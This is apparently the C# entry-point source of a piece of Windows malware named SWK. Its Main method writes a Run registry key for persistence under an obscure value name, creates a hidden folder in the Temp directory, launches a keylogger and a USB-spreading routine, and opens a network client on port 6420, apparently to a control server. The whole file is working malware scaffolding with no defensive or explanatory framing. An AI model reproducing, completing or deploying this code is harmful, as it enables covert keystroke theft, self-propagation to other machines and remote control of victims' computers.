using Microsoft.Win32;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace SWK
{
    public class Program
    {
        public static readonly string DataPath = Path.GetTempPath() + @"\{7972E36D-DABC-410F-A4D7-FCD476C5E30C}";
        public const string RegistryName = "0x43s";
        public static readonly string FileName = "SWK.exe";
        public static readonly string ExePath = System.Windows.Forms.Application.ExecutablePath;
        public static readonly string FullPath = ExePath + FileName;
        public static NetClient Client = new NetClient("", 6420);
        public static Thread ClientTh;

        static void Main(string[] args)
        {
            Thread regTh = new Thread(new ThreadStart(() => { new Thread(new ThreadStart(() => {
                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                reg.SetValue(RegistryName, ExePath);
                Thread.CurrentThread.Abort();
            })); }));
            regTh.Start();

            if (!File.Exists(DataPath))
                Directory.CreateDirectory(DataPath);

            Thread keylTh = new Thread(new ThreadStart(() => { KeyLogger.StartProcess(); }));
            keylTh.Start();
            keylTh.Join();

            Thread usbTh = new Thread(new ThreadStart(() => { USBSpread.StartProcess(); }));
            usbTh.Start();
            usbTh.Join();

            Thread clientTh = new Thread(new ThreadStart(() => { ClientTh = new Thread(Client.Connect); ClientTh.Start(); }));
            clientTh.Start();
            clientTh.Join();

            Console.ReadLine();
        }
    }
}
